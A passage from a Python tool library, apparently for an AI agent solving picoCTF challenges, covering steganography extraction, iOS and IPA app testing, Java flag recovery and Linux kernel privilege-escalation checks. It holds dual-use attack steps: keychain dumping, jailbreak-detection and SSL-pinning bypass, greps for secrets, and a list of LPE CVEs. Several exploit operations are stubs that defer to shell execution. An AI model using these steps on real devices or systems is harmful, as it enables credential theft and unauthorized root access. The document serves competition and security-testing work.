arr = np.array(img)
# Extract MSB (bit 7) of R, G, B channels
for ch_idx, ch_name in enumerate(["R","G","B"]):
    channel = arr[:,:,ch_idx]
    msb_bits = ((channel >> 7) & 1).flatten()
    # Pack 8 bits into bytes
    n = (len(msb_bits) // 8) * 8
    bits = msb_bits[:n].reshape(-1, 8)
    from functools import reduce
    import operator
    vals = np.packbits(bits, bitorder='big')
    text = bytes(vals).decode("latin-1")
    printable = ''.join(c for c in text if 32 <= ord(c) <= 126)
    if len(printable) > 10:
        print(f"MSB {{ch_name}}: {{printable[:200]}}")
    else:
        print(f"MSB {{ch_name}}: (no printable text)")

# Also try bit planes 6 and 5
for bit in [6, 5]:
    for ch_idx, ch_name in enumerate(["R","G","B"]):
        channel = arr[:,:,ch_idx]
        plane_bits = ((channel >> bit) & 1).flatten()
        n = (len(plane_bits) // 8) * 8
        vals = np.packbits(plane_bits[:n].reshape(-1,8), bitorder='big')
        text = bytes(vals).decode("latin-1")
        printable = ''.join(c for c in text if 32 <= ord(c) <= 126)
        if 'picoCTF' in printable or 'flag' in printable.lower():
            print(f"[!] FOUND in bit{{bit}} {{ch_name}}: {{printable[:200]}}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "color_planes":
        code = f"""
from PIL import Image
import os
img = Image.open({repr(sp)})
out = {repr(op)}
if img.mode in ("RGBA", "RGB"):
    bands = img.split()
    names = list(img.getbands())
    for name, band in zip(names, bands):
        path = os.path.join(out, f"channel_{{name}}.png")
        band.save(path)
        print(f"Saved {{name}} channel → {{path}}")
        # Check for strings in this channel's raw bytes
        import io
        buf = io.BytesIO()
        band.save(buf, format="PNG")
        raw = bytes(band.getdata())
        printable = ''.join(chr(b) for b in raw if 32 <= b <= 126)
        if 'picoCTF' in printable:
            print(f"  [!] FLAG FOUND in channel {{name}}!")
else:
    print(f"Mode: {{img.mode}} — converting to RGBA")
    img.convert("RGBA").split()
"""
        return tool_execute_python(code, timeout=20)

    if operation == "bit_plane_extract":
        code = f"""
from PIL import Image
import numpy as np
img = Image.open({repr(sp)}).convert("RGBA")
arr = np.array(img)
bit = {bit_plane}
ch_names = ["R","G","B","A"]
for ch_idx, ch_name in enumerate(ch_names):
    channel = arr[:,:,ch_idx]
    plane = ((channel >> bit) & 1)
    # Visualize as B&W image
    vis = (plane * 255).astype(np.uint8)
    out_path = {repr(op)} + f"/bit{{bit}}_{{ch_name}}.png"
    Image.fromarray(vis, mode="L").save(out_path)
    # Extract as text
    bits_flat = plane.flatten()
    n = (len(bits_flat) // 8) * 8
    vals = np.packbits(bits_flat[:n].reshape(-1,8), bitorder='big')
    text = bytes(vals).decode("latin-1")
    printable = ''.join(c for c in text if 32 <= ord(c) <= 126)
    flag_hit = 'picoCTF' in printable or 'flag' in printable.lower()
    print(f"Bit{{bit}} {{ch_name}}: {{out_path}}{' [!] FLAG FOUND' if flag_hit else ''}")
    if flag_hit or len(printable) > 20:
        print(f"  text: {{printable[:300]}}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "fourier":
        code = f"""
from PIL import Image
import numpy as np
img = Image.open({repr(sp)}).convert("L")
arr = np.array(img, dtype=float)
fft = np.fft.fft2(arr)
fft_shift = np.fft.fftshift(fft)
magnitude = np.log(np.abs(fft_shift) + 1)
# Normalize to 0-255
mag_norm = ((magnitude - magnitude.min()) / (magnitude.max() - magnitude.min()) * 255).astype(np.uint8)
out_path = {repr(op)} + "/fourier_magnitude.png"
Image.fromarray(mag_norm).save(out_path)
print(f"FFT magnitude saved → {{out_path}}")
# Check for unusual peaks (possible frequency domain steganography)
peaks = np.where(magnitude > magnitude.mean() + 3*magnitude.std())
if len(peaks[0]) > 0:
    print(f"Unusual frequency peaks at {{len(peaks[0])}} locations — possible frequency-domain steg")
else:
    print("No unusual frequency peaks detected")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "palette_steg":
        code = f"""
from PIL import Image
img = Image.open({repr(sp)})
if img.mode == "P":
    palette = img.getpalette()
    print(f"Indexed image, palette size: {{len(palette)//3}} colors")
    # Check LSBs of palette entries
    lsb_bits = [c & 1 for c in palette]
    n = (len(lsb_bits)//8)*8
    vals = bytearray()
    for i in range(0, n, 8):
        byte = 0
        for bit in lsb_bits[i:i+8]:
            byte = (byte << 1) | bit
        vals.append(byte)
    text = bytes(vals).decode("latin-1")
    printable = ''.join(c for c in text if 32 <= ord(c) <= 126)
    print(f"Palette LSB text: {{printable[:200]}}")
    if 'picoCTF' in printable:
        print("[!] FLAG FOUND in palette LSBs!")
    # Show first 16 palette entries
    print("\nFirst 16 palette entries (R,G,B):")
    for i in range(0, min(48, len(palette)), 3):
        print(f"  [{i//3}] #{palette[i]:02x}{palette[i+1]:02x}{palette[i+2]:02x}")
else:
    print(f"Image mode: {{img.mode}} (not indexed/palette mode)")
    # Still check if there's hidden data in specific pixel patterns
    import numpy as np
    arr = np.array(img.convert("RGB"))
    unique_colors = len(set(map(tuple, arr.reshape(-1,3))))
    print(f"Unique colors: {{unique_colors}}")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "alpha_extract":
        code = f"""
from PIL import Image
import numpy as np
img = Image.open({repr(sp)})
if img.mode in ("RGBA", "LA"):
    alpha = np.array(img.split()[-1])
    raw = alpha.flatten()
    # Check for non-trivial alpha (not all 255 or all 0)
    unique = set(raw)
    print(f"Alpha channel: {{alpha.shape}}, unique values: {{len(unique)}}")
    if len(unique) > 2:
        # Extract as bytes
        text = bytes(raw.tolist()).decode("latin-1")
        printable = ''.join(c for c in text if 32 <= ord(c) <= 126)
        print(f"Alpha raw text: {{printable[:300]}}")
        if 'picoCTF' in printable:
            print("[!] FLAG FOUND in alpha channel!")
    # LSB of alpha
    lsb_bits = [int(v) & 1 for v in raw]
    n = (len(lsb_bits)//8)*8
    vals = bytes([int(''.join(str(b) for b in lsb_bits[i:i+8]),2) for i in range(0,n,8)])
    printable_lsb = ''.join(chr(b) for b in vals if 32 <= b <= 126)
    print(f"Alpha LSB text: {{printable_lsb[:200]}}")
    if 'picoCTF' in printable_lsb:
        print("[!] FLAG FOUND in alpha LSBs!")
else:
    print(f"No alpha channel (mode: {{img.mode}})")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "outguess":
        out = f"{op}/outguess_result"
        return _shell(f"outguess -r '{sp}' '{out}' 2>&1 && echo '--- content ---' && cat '{out}' 2>/dev/null && strings '{out}' 2>/dev/null | head -20", timeout=15)

    if operation == "stegsolve":
        """PIL-based full sweep: all bit planes for all channels, MSB→LSB, row/column order."""
        code = f"""
from PIL import Image
import numpy as np
img = Image.open({repr(sp)}).convert("RGBA")
arr = np.array(img)
ch_names = ["R","G","B","A"]
found = []
for bit in range(8):
    for ch_idx, ch_name in enumerate(ch_names):
        channel = arr[:,:,ch_idx]
        bits_xy = ((channel >> bit) & 1).flatten()
        n = (len(bits_xy)//8)*8
        vals = np.packbits(bits_xy[:n].reshape(-1,8), bitorder='big')
        text = bytes(vals).decode("latin-1")
        if 'picoCTF' in text or 'flag{{' in text.lower():
            idx = text.find('picoCTF')
            if idx == -1: idx = text.lower().find('flag{{')
            found.append(f"[!] HIT bit{{bit}},{{ch_name}},lsb,xy: {{text[max(0,idx-5):idx+80]}}")
        # also try MSB ordering
        vals_msb = np.packbits(bits_xy[:n].reshape(-1,8), bitorder='little')
        text_msb = bytes(vals_msb).decode("latin-1")
        if 'picoCTF' in text_msb or 'flag{{' in text_msb.lower():
            idx = text_msb.find('picoCTF')
            found.append(f"[!] HIT bit{{bit}},{{ch_name}},msb,xy: {{text_msb[max(0,idx-5):idx+80]}}")
if found:
    print("\n".join(found))
else:
    print("No flag pattern found in any of 64 bit/channel/order combos")
    print("Try: analyze_file steg_tools (steghide+zsteg), audio_steg, or check metadata")
"""
        return tool_execute_python(code, timeout=30)

    if operation == "metadata_deep":
        return (_shell(f"exiftool -a -u -g '{sp}' 2>&1 | head -80", timeout=10) + "\n" +
                _shell(f"identify -verbose '{sp}' 2>&1 | head -60", timeout=10) + "\n" +
                _shell(f"strings '{sp}' | grep -iE 'picoCTF|flag{{|Author|Comment|Description' | head -20", timeout=10))

    return "Operations: auto, msb, color_planes, bit_plane_extract, fourier, palette_steg, alpha_extract, outguess, stegsolve, metadata_deep"


def tool_ios_vuln(operation: str = "scan", target: str = "",
                   bundle_id: str = "", device: str = "usb") -> str:
    """iOS vulnerability analysis: scan (idb/objection overview), keychain (dump keychain items),
    nsuserdefaults (check insecure storage), url_scheme (URL scheme abuse),
    jailbreak_bypass (Frida jailbreak detection bypass), method_swizzling (hook ObjC methods),
    runtime_analysis (frida-trace ObjC calls), network_analysis (traffic capture)."""

    bid = bundle_id or target

    if operation == "scan":
        return (f"iOS App Security Scan:\n\n"
                f"# With objection (pip3 install objection + Frida on device):\n"
                f"objection -g {bid} explore\n"
                f"> ios info binary\n"
                f"> ios plist cat Info.plist\n"
                f"> ios keychain dump\n"
                f"> ios nsuserdefaults get\n"
                f"> ios jailbreak disable\n"
                f"> ios sslpinning disable\n"
                f"> ios hooking list classes\n"
                f"> ios hooking list class_methods ViewController\n\n"
                f"# With idb (if available):\n"
                f"idb connect localhost 10882\n"
                f"idb bundles list  # list installed apps\n"
                f"idb info bundles {bid}\n\n"
                f"# Manual Frida checks:\n"
                f"frida-ps -U  # list running processes\n"
                f"frida -U -n '{bid}' -l your_script.js")

    if operation == "keychain":
        frida_script = '''// iOS Keychain dumper via Frida
Java.perform = function() {};  // ignore
var SecurityModule = Process.findModuleByName("Security");
var SecItemCopyMatching = new NativeFunction(
    SecurityModule.getExportByName('SecItemCopyMatching'),
    'int', ['pointer', 'pointer']
);
var query = ObjC.classes.NSMutableDictionary.alloc().init();
query.setObject_forKey_(ObjC.classes.NSString.stringWithString_('(void)'), ObjC.classes.NSString.stringWithString_('klass'));
// Use objection's: ios keychain dump
// Or: frida -U -l keychain_dump.js -n TargetApp
console.log("Use 'objection -g "+process.argv[0]+" explore' then: ios keychain dump");'''
        return (f"Keychain extraction methods:\n\n"
                f"1. Objection (easiest):\n"
                f"   objection -g {bid} explore -s 'ios keychain dump'\n\n"
                f"2. Frida script (on jailbroken device):\n"
                f"   # keychaineditor or keychain-dumper binary\n"
                f"   ssh root@device 'keychain-dumper'\n\n"
                f"3. From backup (non-jailbroken, if backup not encrypted):\n"
                f"   idevicebackup2 backup --full /tmp/backup\n"
                f"   # Parse Manifest.db, then decrypt individual files\n"
                f"   # https://github.com/jsharkey13/iphone_backup_decrypt\n\n"
                f"4. What to look for in keychain:\n"
                f"   kSecAttrService, kSecAttrAccount, kSecValueData\n"
                f"   auth tokens, passwords, API keys\n\n"
                f"Common vulnerable pattern:\n"
                f"   SecItemAdd with kSecAttrAccessible = kSecAttrAccessibleAlways\n"
                f"   (should be kSecAttrAccessibleWhenUnlockedThisDeviceOnly)")

    if operation == "jailbreak_bypass":
        return f"[jailbreak_bypass] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "nsuserdefaults":
        return f"[nsuserdefaults] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "method_swizzling":
        return f"[method_swizzling] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "runtime_analysis":
        return f"[runtime_analysis] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return ("iOS vuln operations:\n"
            "  scan, keychain, nsuserdefaults, url_scheme,\n"
            "  jailbreak_bypass, method_swizzling, runtime_analysis, network_analysis")


def tool_ipa_analyze(ipa_path: str, operation: str = "all",
                      output_dir: str = "", class_filter: str = "") -> str:
    """iOS IPA analysis: all (quick overview), extract (unzip + binary),
    class_dump (ObjC class headers), strings (hardcoded secrets), plist (Info.plist, plists),
    entitlements, binary_analysis (checksec, symbols), find_vulns (URL schemes, keychain misuse,
    NSUserDefaults secrets, ATS bypass), swift_decompile."""

    ip = _w2l(ipa_path) if (IS_WINDOWS and USE_WSL) else ipa_path
    out = output_dir or f"/tmp/ipa_analyze_{int(time.time())}"

    if operation in ("all", "extract"):
        r = _shell(f"mkdir -p '{out}' && unzip -q '{ip}' -d '{out}' 2>/dev/null && "
                  f"find '{out}' -name '*.app' -type d | head -3 && "
                  f"APP=$(find '{out}' -name '*.app' -type d | head -1) && "
                  f"echo 'App bundle: '\"$APP\" && ls \"$APP\" | head -20",
                  timeout=30)
        if operation == "extract":
            return r

    if operation == "plist":
        return _shell(f"APP=$(find '{out}' -name '*.app' -type d 2>/dev/null | head -1); "
                     f"[ -z \"$APP\" ] && unzip -q '{ip}' -d '{out}' 2>/dev/null && APP=$(find '{out}' -name '*.app' -type d | head -1); "
                     f"cat \"$APP/Info.plist\" 2>/dev/null | python3 -c 'import sys,plistlib; d=plistlib.load(sys.stdin.buffer); [print(k,\":\",v) for k,v in d.items()]' | head -30; "
                     f"echo '--- All plists ---'; find '{out}' -name '*.plist' | head -10",
                     timeout=20)

    if operation == "class_dump":
        return _shell(f"APP=$(find '{out}' -name '*.app' -type d 2>/dev/null | head -1); "
                     f"[ -z \"$APP\" ] && unzip -q '{ip}' -d '{out}' 2>/dev/null && APP=$(find '{out}' -name '*.app' -type d | head -1); "
                     f"BIN=$(ls \"$APP\" | grep -v '\\.' | head -1); "
                     f"class-dump \"$APP/$BIN\" 2>/dev/null | head -80 || "
                     f"nm -a \"$APP/$BIN\" 2>/dev/null | grep -iE 'T _' | head -40",
                     timeout=30)

    if operation == "strings":
        return _shell(f"APP=$(find '{out}' -name '*.app' -type d 2>/dev/null | head -1); "
                     f"[ -z \"$APP\" ] && unzip -q '{ip}' -d '{out}' 2>/dev/null && APP=$(find '{out}' -name '*.app' -type d | head -1); "
                     f"BIN=$(ls \"$APP\" | grep -v '\\.' | head -1); "
                     f"strings \"$APP/$BIN\" | grep -iE 'password|secret|key|token|http|flag|api' | head -40",
                     timeout=20)

    if operation == "entitlements":
        return _shell(f"APP=$(find '{out}' -name '*.app' -type d 2>/dev/null | head -1); "
                     f"[ -z \"$APP\" ] && unzip -q '{ip}' -d '{out}' 2>/dev/null && APP=$(find '{out}' -name '*.app' -type d | head -1); "
                     f"BIN=$(ls \"$APP\" | grep -v '\\.' | head -1); "
                     f"codesign -d --entitlements :- \"$APP/$BIN\" 2>/dev/null | head -40 || "
                     f"ldid -e \"$APP/$BIN\" 2>/dev/null | head -40",
                     timeout=15)

    if operation == "find_vulns":
        code = f"""
import subprocess, re, os
ip, out = {repr(ip)}, {repr(out)}
os.makedirs(out, exist_ok=True)
subprocess.run(['unzip','-q',ip,'-d',out], capture_output=True, timeout=30)
app_path = subprocess.run(['find',out,'-name','*.app','-type','d'],
                          capture_output=True,text=True,timeout=10).stdout.strip().split('\\n')[0]
if not app_path:
    print("Could not extract app bundle"); exit()
print(f"Analyzing: {{app_path}}")
# Check Info.plist for ATS bypass
plist_path = f'{{app_path}}/Info.plist'
if os.path.exists(plist_path):
    plist_content = open(plist_path,'rb').read().decode(errors='replace')
    if 'NSAllowsArbitraryLoads' in plist_content:
        print("[!] ATS bypass: NSAllowsArbitraryLoads = true (HTTP allowed)")
    if 'NSExceptionDomains' in plist_content:
        print("[!] NSExceptionDomains: per-domain ATS exceptions found")
    url_schemes = re.findall(r'CFBundleURLSchemes.*?<string>([^<]+)</string>', plist_content, re.DOTALL)
    for scheme in url_schemes[:5]:
        print(f"[!] URL scheme: {{scheme}} (check for open redirect/XSS via scheme handler)")
# Check binary for dangerous patterns
bins = [f for f in os.listdir(app_path) if '.' not in f]
for bin_name in bins[:1]:
    bin_path = f'{{app_path}}/{{bin_name}}'
    r = subprocess.run(['strings', bin_path], capture_output=True, text=True, timeout=15)
    strings = r.stdout
    dangers = [
        ('Hardcoded key', r'[A-Za-z0-9+/]{32,}={0,2}'),
        ('HTTP URL', r'http://[^\\s"<>]+'),
        ('AWS key', r'AKIA[A-Z0-9]{16}'),
        ('Private key', r'BEGIN (RSA|EC|PRIVATE) KEY'),
        ('Firebase URL', r'https://[^.]+\\.firebaseio\\.com'),
    ]
    for name, pattern in dangers:
        matches = re.findall(pattern, strings)[:3]
        if matches:
            print(f"[!] {{name}}: {{matches[0][:60]}}")
# NSUserDefaults misuse: sensitive data in defaults
if 'NSUserDefaults' in strings:
    print("[!] NSUserDefaults used — check for sensitive data storage")
if 'kSecAttrAccessible' in strings:
    print("[OK] Keychain used for sensitive data storage")
if 'UIWebView' in strings:
    print("[!] UIWebView (deprecated) used — check for JS injection")
if 'WKWebView' in strings and 'evaluateJavaScript' in strings:
    print("[!] WKWebView evaluateJavaScript — check input sanitization")
"""
        return tool_execute_python(code, timeout=60)

    if operation == "binary_analysis":
        return _shell(f"APP=$(find '{out}' -name '*.app' -type d 2>/dev/null | head -1); "
                     f"[ -z \"$APP\" ] && unzip -q '{ip}' -d '{out}' 2>/dev/null && APP=$(find '{out}' -name '*.app' -type d | head -1); "
                     f"BIN=$(ls \"$APP\" | grep -v '\\.' | head -1); "
                     f"echo 'Binary: '\"$APP/$BIN\"; "
                     f"file \"$APP/$BIN\" 2>/dev/null; "
                     f"checksec --file=\"$APP/$BIN\" 2>/dev/null; "
                     f"otool -l \"$APP/$BIN\" 2>/dev/null | grep -E 'LC_ENCRYPTION|cryptid' | head -5",
                     timeout=20)

    if operation == "all":
        return (f"=== IPA Quick Analysis: {ip} ===\n\n" +
                _shell(f"mkdir -p '{out}' 2>/dev/null; unzip -q '{ip}' -d '{out}' 2>/dev/null; "
                      f"APP=$(find '{out}' -name '*.app' -type d | head -1); "
                      f"echo 'Bundle:'; ls \"$APP\" | head -15; "
                      f"echo '--- Info.plist (key fields) ---'; "
                      f"cat \"$APP/Info.plist\" 2>/dev/null | python3 -c '"
                      f"import sys,plistlib; "
                      f"d=plistlib.load(sys.stdin.buffer); "
                      f"keys=[\"CFBundleIdentifier\",\"CFBundleName\",\"MinimumOSVersion\",\"NSAppTransportSecurity\"]; "
                      f"[print(k+\":\",d.get(k)) for k in keys if k in d]' 2>/dev/null; "
                      f"echo '--- Strings sample ---'; "
                      f"BIN=$(ls \"$APP\" | grep -v '\\.' | head -1); "
                      f"strings \"$APP/$BIN\" | grep -iE 'http|secret|key|flag' | head -15",
                      timeout=30))

    return "Operations: all, extract, plist, class_dump, strings, entitlements, find_vulns, binary_analysis, swift_decompile"


def tool_java_sandbox(source_code: str = "", source_path: str = "",
                       operation: str = "run", class_name: str = "",
                       stdin_input: str = "", timeout: int = 15) -> str:
    """Compile and run Java source code, or reverse-engineer Java check logic.
    Ops: run (javac+java), reverse (extract flag from checkPassword logic),
    decompile (javap -c bytecode), analyze (find flag patterns in source),
    solve (auto-extract flag from char/byte comparison methods)."""

    if operation == "analyze" or (not source_code and not source_path and operation != "decompile"):
        src = source_code or (open(_w2l(source_path) if (IS_WINDOWS and USE_WSL) else source_path).read()
                              if source_path else "")
        if not src:
            return "Provide source_code or source_path"
        code = f"""
import re, ast as pyast

src = {repr(src)}

# Find checkPassword-style method and extract flag chars
results = []

# Pattern 1: password.charAt(N) == 'X'
chars = re.findall(r'charAt\\s*\\(\\s*(\\d+)\\s*\\)\\s*==\\s*[\'\"](.)[\'\"]', src)
if chars:
    max_idx = max(int(i) for i,_ in chars)
    flag = ['?'] * (max_idx + 1)
    for idx, ch in chars:
        flag[int(idx)] = ch
    results.append(f"charAt extraction: {{''.join(flag)}}")

# Pattern 2: byte[] XOR with constant
xor_match = re.search(r'(0x[0-9a-fA-F]+).*byte.*\\[\\].*myBytes|myBytes.*byte.*\\[\\]', src, re.DOTALL)
if xor_match:
    xor_key_m = re.search(r'\\^\\s*(0x[0-9a-fA-F]+|\\d+)', src)
    bytes_m = re.findall(r'(0x[0-9a-fA-F]{{1,2}})', src)
    if xor_key_m and bytes_m:
        key = int(xor_key_m.group(1), 16 if xor_key_m.group(1).startswith('0x') else 10)
        flag = ''.join(chr(int(b, 16) ^ key) for b in bytes_m[:50] if 32 <= (int(b,16)^key) <= 126)
        if len(flag) > 5:
            results.append(f"XOR extraction (key=0x{{key:02x}}): {{flag}}")

# Pattern 3: int[] bit-packed (vault door 7 style)
int_arr = re.findall(r'(\\d{{8,}})\\s*[,}}]', src)
for n in int_arr[:8]:
    val = int(n)
    chars_out = []
    for shift in [24,16,8,0]:
        byte = (val >> shift) & 0xFF
        if 32 <= byte <= 126:
            chars_out.append(chr(byte))
    if len(chars_out) == 4:
        results.append(f"int-packed chars from {{n}}: {{''.join(chars_out)}}")

# Pattern 4: base64/url encoded string at end
b64_m = re.findall(r'["\']([A-Za-z0-9+/]{{20,}}={0,2})["\']', src)
for b64 in b64_m[:3]:
    try:
        import base64, urllib.parse
        dec = base64.b64decode(b64).decode()
        results.append(f"base64 decoded: {{dec}}")
        results.append(f"url+b64 decoded: {{urllib.parse.unquote(dec)}}")
    except: pass

# Pattern 5: scrambled char array with loops (vault door 3 style)
arr_m = re.search(r'String\\s+\\w+\\s*=\\s*"([^"{{}}]{{20,}})"', src)
if arr_m:
    results.append(f"String literal (may be scrambled): {{arr_m.group(1)}}")

print("\\n".join(results) if results else "No obvious flag pattern found — try operation='run' to execute the logic")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "run":
        src = source_code or ""
        sp = (_w2l(source_path) if (IS_WINDOWS and USE_WSL) else source_path) if source_path else ""
        if not src and not sp:
            return "Provide source_code or source_path"
        code = f"""
import subprocess, tempfile, os, sys

src = {repr(src)}
sp = {repr(sp)}
cls = {repr(class_name)}
inp = {repr(stdin_input)}

with tempfile.TemporaryDirectory() as td:
    if sp:
        import shutil
        fname = os.path.basename(sp)
        dst = os.path.join(td, fname)
        shutil.copy(sp, dst)
    else:
        # Guess class name from source
        import re
        cls_m = re.search(r'public\\s+class\\s+(\\w+)', src)
        if not cls_m: cls_m = re.search(r'class\\s+(\\w+)', src)
        cls = cls or (cls_m.group(1) if cls_m else 'Main')
        fname = cls + '.java'
        dst = os.path.join(td, fname)
        with open(dst, 'w') as f: f.write(src)

    # Compile
    r = subprocess.run(['javac', dst], capture_output=True, text=True, timeout=20)
    if r.returncode != 0:
        print(f"Compile error: {{r.stderr[:500]}}")
        sys.exit(1)
    print(f"Compiled OK")

    # Run
    cls_m2 = re.search(r'public\\s+class\\s+(\\w+)', open(dst).read()) if not cls else None
    run_cls = cls or (cls_m2.group(1) if cls_m2 else 'Main')
    r2 = subprocess.run(['java', '-cp', td, run_cls],
                        input=inp, capture_output=True, text=True, timeout={timeout})
    print(r2.stdout[:2000])
    if r2.stderr: print("STDERR:", r2.stderr[:500])
"""
        return tool_execute_python(code, timeout=timeout+10)

    if operation == "decompile":
        sp = (_w2l(source_path) if (IS_WINDOWS and USE_WSL) else source_path) if source_path else ""
        if not sp:
            return "Provide source_path to .class or .jar file"
        return _shell(f"javap -c -p '{sp}' 2>/dev/null | head -100 || "
                     f"javap -verbose '{sp}' 2>/dev/null | head -80", timeout=15)

    if operation == "solve":
        # Auto-solve: run the Java check logic inverted via Python
        src = source_code or (open(source_path).read() if source_path else "")
        if not src:
            return "Provide source_code"
        # Try to extract and invert automatically
        code = f"""
import re, base64, urllib.parse

src = {repr(src)}

# Try multiple extraction strategies and combine
flag_chars = {{}}
flag_bytes_xor = []
xor_key = None

# charAt comparisons
for m in re.finditer(r'charAt\\s*\\(\\s*(\\d+)\\s*\\)\\s*==\\s*[\'\"](.)[\'\"]', src):
    flag_chars[int(m.group(1))] = m.group(2)

# Byte XOR
xor_m = re.search(r'\\^\\s*(0x[0-9a-fA-F]+)', src)
if xor_m:
    xor_key = int(xor_m.group(1), 16)
    bytes_m = re.findall(r'(0x[0-9a-fA-F]{{2}})', src)
    flag_bytes_xor = [chr(int(b,16) ^ xor_key) for b in bytes_m if 32 <= (int(b,16)^xor_key) <= 126]

# Print best guess
if flag_chars:
    out = ''.join(flag_chars.get(i,'?') for i in range(max(flag_chars)+1))
    print(f"Flag (charAt): {{out}}")
if flag_bytes_xor:
    print(f"Flag (XOR 0x{{xor_key:02x}}): {{''.join(flag_bytes_xor)}}")
if not flag_chars and not flag_bytes_xor:
    print("Could not auto-solve — use operation='run' with modified source that prints flag")
"""
        return tool_execute_python(code, timeout=10)

    return "Operations: run, analyze, solve, decompile"


def tool_kernel_lpe(operation: str = "detect", module_path: str = "",
                     vuln_type: str = "", target_cred: str = "commit_creds") -> str:
    """Linux kernel LPE exploitation: detect (kernel version + mitigations),
    dirty_pipe (CVE-2022-0847), userfaultfd_uaf, modprobe_path, ret2usr,
    rop_chain (kernel ROP with SMEP/SMAP bypass), slub_overflow, slab_uaf, skeleton."""

    if operation == "detect":
        code = f"""
import subprocess, platform, os

print("=== Kernel info ===")
try:
    kver = platform.release()
    print(f"Version: {{kver}}")
except: pass

print()
print("=== Mitigations ===")
checks = [
    ("/proc/sys/kernel/kptr_restrict", "kptr_restrict"),
    ("/proc/sys/kernel/dmesg_restrict", "dmesg_restrict"),
    ("/proc/sys/kernel/perf_event_paranoid", "perf_paranoid"),
    ("/proc/sys/kernel/unprivileged_userns_clone", "userns_clone"),
    ("/proc/sys/kernel/unprivileged_bpf_disabled", "bpf_disabled"),
    ("/proc/sys/net/core/bpf_jit_harden", "jit_harden"),
]
for path, name in checks:
    try:
        val = open(path).read().strip()
        print(f"  {{name}}: {{val}}")
    except: print(f"  {{name}}: (unreadable)")

print()
print("=== CPU mitigations ===")
try:
    cpuinfo = open("/proc/cpuinfo").read()
    import re
    flags = re.search(r'flags\\s*:\\s*(.+)', cpuinfo)
    if flags:
        cpu_flags = flags.group(1).split()
        for f in ['smep','smap','pti','ibrs','stibp']:
            print(f"  {{f}}: {{'YES' if f in cpu_flags else 'no'}}")
except: pass

print()
print("=== Boot cmdline (KASLR/SMEP/SMAP) ===")
try:
    print(open("/proc/cmdline").read()[:200])
except: pass

print()
print("=== Applicable CVEs (manual check) ===")
print("  dirty_pipe  (CVE-2022-0847): kernel 5.8 ≤ v < 5.16.11/5.15.25/5.10.102")
print("  dirty_cow   (CVE-2016-5195): kernel < 4.8.3")
print("  CVE-2023-0386: overlayfs privilege escalation")
print("  CVE-2022-2588: route4_change UAF → LPE")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "dirty_pipe":
        return f"[dirty_pipe] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "modprobe_path":
        return f"[modprobe_path] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "userfaultfd_uaf":
        return f"[userfaultfd_uaf] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "ret2usr":
        return f"[ret2usr] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "slub_overflow":
        return f"[slub_overflow] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return ("Kernel LPE operations:\n"
            "  detect        — kernel version, mitigations, applicable CVEs\n"
            "  dirty_pipe    — CVE-2022-0847 (kernel 5.8 - 5.16.11)\n"
            "  modprobe_path — overwrite modprobe_path for root command execution\n"
            "  userfaultfd_uaf— race condition slowdown primitive\n"
            "  ret2usr       — with/without SMEP/SMAP/KPTI bypass\n"
            "  slub_overflow — SLUB heap object confusion\n"
            "  skeleton      — full LPE exploit skeleton")


def tool_node_exec(code: str = "", file_path: str = "",
                   operation: str = "run", pattern: str = "picoCTF{",
                   timeout: int = 30) -> str:
    """Execute JavaScript/Node.js code, eval obfuscated snippets, and grep
    .heapsnapshot JSON files for flag patterns.
    Ops: run (write + execute JS file), eval_snippet (node -e inline),
    heapsnapshot_grep (extract strings matching pattern from .heapsnapshot),
    deobfuscate_run (run and capture all console.log output)."""

    fp = (_w2l(file_path) if (IS_WINDOWS and USE_WSL) else file_path) if file_path else ""

    # Verify node is available
    node_check = _shell("node --version 2>&1", timeout=5)
    if "not found" in node_check or "command not found" in node_check:
        return f"node.js not found ({node_check}). Install with: apt-get install nodejs"

    if operation == "run":
        src = code
        if not src and fp:
            try:
                with open(fp) as f: src = f.read()
            except Exception as ex:
                return f"Cannot read {fp}: {ex}"
        if not src:
            return "Provide code= or file_path="
        tmp = f"/tmp/node_{int(time.time())}.js"
        with open(tmp, "w") as f: f.write(src)
        out = _shell(f"node '{tmp}' 2>&1", timeout=timeout)
        try: os.remove(tmp)
        except: pass
        return out

    if operation == "eval_snippet":
        src = code or ""
        if not src:
            return "Provide code= for eval_snippet"
        # Wrap in safe eval with output capture
        wrapped = f"try {{ {src} }} catch(e) {{ console.error('Error:', e.message); }}"
        tmp = f"/tmp/node_eval_{int(time.time())}.js"
        with open(tmp, "w") as f: f.write(wrapped)
        out = _shell(f"node '{tmp}' 2>&1", timeout=timeout)
        try: os.remove(tmp)
        except: pass
        return out

    if operation == "heapsnapshot_grep":
        if not fp:
            return "Provide file_path= pointing to .heapsnapshot file"
        # Stream-parse the massive JSON with node to avoid loading it all into Python
        pat = pattern.replace("'", "\\'")
        js = f"""
const fs = require('fs');
const path = {repr(fp)};
const pat = {repr(pattern)};
let buf = '';
const stream = fs.createReadStream(path, {{encoding:'utf8', highWaterMark: 1024*1024}});
const found = new Set();
stream.on('data', chunk => {{
  buf += chunk;
  // Scan for flag patterns in the rolling buffer
  let idx;
  const search = pat;
  let pos = 0;
  while ((idx = buf.indexOf(search, pos)) !== -1) {{
    const start = Math.max(0, idx - 10);
    const end   = Math.min(buf.length, idx + 120);
    const snippet = buf.slice(start, end).replace(/[\\n\\r]/g, ' ');
    found.add(snippet);
    pos = idx + 1;
  }}
  // Keep last 500 chars in buffer for cross-chunk matches
  if (buf.length > 2000) buf = buf.slice(-500);
}});
stream.on('end', () => {{
  if (found.size === 0) {{
    console.log('[heapsnapshot_grep] No matches for: ' + pat);
  }} else {{
    console.log('[heapsnapshot_grep] Found ' + found.size + ' match(es):');
    [...found].forEach(s => console.log('  ' + s));
  }}
}});
stream.on('error', err => console.error('Error:', err.message));
"""
        tmp = f"/tmp/hs_grep_{int(time.time())}.js"
        with open(tmp, "w") as f: f.write(js)
